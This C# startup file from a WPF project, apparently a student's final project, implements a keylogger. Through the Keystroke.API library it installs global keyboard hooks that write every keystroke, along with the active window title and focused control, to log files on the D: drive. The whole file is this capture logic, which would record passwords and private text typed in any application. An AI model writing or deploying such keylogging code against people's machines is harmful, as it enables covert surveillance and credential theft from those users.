
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using Keystroke.API;

namespace AbschlussprojektWPF
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {
        public Logger LogFile { get; set; }

        public static bool IsLoggingStarted { get; set; }

        protected override void OnStartup(StartupEventArgs e)
        {
            using (var api = new KeystrokeAPI())
            {
                KeystrokeAPI ki = new KeystrokeAPI();
                api.CreateKeyboardHook((character) =>
                {
                    if (IsLoggingStarted)
                    {
                        File.AppendAllText(@"D:\KeyLog.txt",
                            character + " " + LogFile.GetTitleOfActiveWindow() + " " + LogFile.GetFocusedControl() +
                            "\r\n\r\n");
                    }
                });
                api.CreateKeyboardHook((character) =>
                {
                    if (IsLoggingStarted)
                    {
                        File.AppendAllText(@"D:\KeysOnly.txt", character + "\r\n\r\n");
                    }
                });

            }
            base.OnStartup(e);
        }
    }
}